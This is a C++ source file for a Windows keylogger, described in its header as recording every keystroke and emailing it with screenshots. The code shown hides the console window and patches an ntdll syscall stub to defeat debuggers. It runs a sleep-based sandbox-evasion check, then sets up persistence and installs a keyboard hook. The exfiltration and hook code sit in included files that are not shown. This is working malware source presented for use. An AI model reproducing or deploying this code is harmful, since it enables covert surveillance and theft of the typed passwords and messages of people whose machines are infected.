/*
	File: main.cpp
	Author: Ayoub Nouri
	Description: This is an Advanced Keylogger that records every keystroke and send them via email with a screenshot of the current opened window.
*/

#include<iostream>
#include<Windows.h>
#include<functional>
#include<stdio.h>
#include<thread>
#include"Helper.h"
#include"KeyConstant.h"
#include"Base64.h"
#include"IO.h"
#include"Timer.h"
#include"SendMail.h"
#include"KeyBoardHook.h"
#include"Persist.h"
#include<ShellScalingApi.h>
using namespace std;

BOOL isExecuted() {
	DWORD t1 = GetTickCount();
	int Val = 1;
	while (Val != 0) {
		switch (Val)
		{
		case 1:
			Sleep(15000);
			Val = 2;
			break;
		case 2:
			for (int i = 0; i < 10; i++) {
				Val++;
				Val--;
			}
			Val++;
			Sleep(15000);
			break;
		case 3:
			if (Val <= 1000)
				Val *= 0;
			else
				Val = 0 / Val;
			Sleep(30000);
			break;
		}
	}
	DWORD t2 = GetTickCount();
	cout << t1 << endl << t2 << endl;
	if (t2 - t1 >= 60000 && t2 - t1 <= 61000) {
		return TRUE;
	}
	else {
		return FALSE;
	}
}


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow){

	ShowWindow(GetConsoleWindow(),SW_HIDE);

	FARPROC ZwR =
		GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwResumeThread");
	FARPROC ZwS =
		GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwSuspendThread");
	DWORD sys_res, sys_sus;
	memcpy(&sys_res, (char*)((char*)ZwR + 1), 4);
	//Get the syscall number of ZwResumeThread 
	memcpy(&sys_sus, (char*)((char*)ZwS + 1), 4);
	//Get the syscall number of ZwSuspendThread 
	DWORD old;
	VirtualProtect(ZwS, 5, PAGE_EXECUTE_READWRITE, &old);
	//Set the writing permission for ZwSuspendThread 
	memcpy(((char*)ZwS + 1), &sys_res, 4);
	//change the syscall number of ZwSuspendThread to ZwResumeThread 
	SuspendThread(GetCurrentThread());
	memcpy(((char*)ZwS + 1), &sys_sus, 4); //Restore the syscall number
	VirtualProtect(ZwS, 5, old, NULL);



	if (isExecuted()) {
		Persist::MakePersistence();
		InstallHook();
		MSG message;
		while (GetMessage(&message, NULL, 0, 0)) {
			TranslateMessage(&message);
			DispatchMessage(&message);
		}
		//UnhookWindowsHookEx(eh);
	}
	else {
		exit(0);
	}


	return 0;
}
